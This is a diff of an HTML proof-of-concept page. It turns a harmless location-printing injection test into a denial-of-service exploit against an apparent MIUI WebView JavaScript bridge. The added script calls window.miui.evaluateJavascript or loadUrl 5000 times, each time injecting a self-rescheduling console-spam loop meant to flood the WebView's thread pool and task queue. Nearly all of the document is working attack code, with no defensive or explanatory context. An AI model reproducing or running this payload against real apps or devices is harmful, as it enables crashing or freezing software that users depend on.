@@ -1,14 +1,29 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>PoC JS Injection</title>
-<h3>PoC JS injection test</h3>
-<p>Open with param ?q=PAYLOAD</p>
+<title>MIUI WebView DoS POC</title>
+<body>
+<h1>Trigger DoS via ThreadPool / LinkedBlockingQueue</h1>
 <script>
-(function(){
-  // prints location so you can craft injection in native code
-  document.body.appendChild(document.createElement('pre')).textContent =
-    "location: " + location.href + "\n" +
-    "hash: " + location.hash + "\n" +
-    "search: " + location.search;
+(function flood(){
+  try {
+    // payload heavy: recursive evaluateJavascript calls
+    var payload = `
+      (function spam(){
+        for (var i=0;i<1000;i++){
+          console.log("spam-"+i);
+        }
+        setTimeout(spam,0);
+      })();
+    `;
+
+    // Jalankan berulang-ulang ke WebView engine
+    for (let i = 0; i < 5000; i++) {
+      window.miui && window.miui.evaluateJavascript
+        ? window.miui.evaluateJavascript(payload, null)
+        : window.miui && window.miui.loadUrl("javascript:" + payload);
+    }
+
+  } catch(e) {}
 })();
 </script>
+</body>
